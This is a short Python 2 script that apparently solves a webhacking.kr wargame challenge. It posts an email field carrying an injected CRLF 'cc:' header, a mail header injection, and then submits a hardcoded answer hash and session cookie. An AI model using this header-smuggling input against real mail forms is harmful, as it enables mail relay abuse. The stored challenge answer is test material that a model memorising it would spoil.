#-*- coding: utf-8 -*-
import urllib
import urllib2
import CookieManager

print "[+] Mail Header Injection"

challengeUrl = "http://webhacking.kr/challenge/bonus/bonus-11/index.php"
parameter = urllib.urlencode({
    "email": "bindon@hanmir.com\r\ncc:bindon@hanmir.com"
})
CookieManager.addCookie("PHPSESSID", "73ea5f35f558006f21f6185c171a2ed9")
httpRequest = urllib2.Request(challengeUrl, parameter)
httpRequest.add_header("Cookie", CookieManager.getCookie())
httpConnection = None
try:
    httpConnection = urllib2.urlopen(httpRequest)
    httpResponse = httpConnection.read()
    print httpResponse
except:
    raise
finally:
    if httpConnection != None:
        httpConnection.close()

print "[*] Auth"
challengeUrl = "http://webhacking.kr/index.php?mode=auth_go"
parameter = urllib.urlencode({
    "answer": "005eefe6b143db0f7d69b196df100043"
});
httpRequest = urllib2.Request(challengeUrl, data=parameter)
httpRequest.add_header("Cookie", CookieManager.getCookie())
httpRequest.get_method = lambda: 'POST'

try:
    httpConnection = urllib2.urlopen(httpRequest)
    httpResponse = httpConnection.read()
    print httpResponse
except:
    raise
finally:
    if httpConnection != None:
        httpConnection.close()
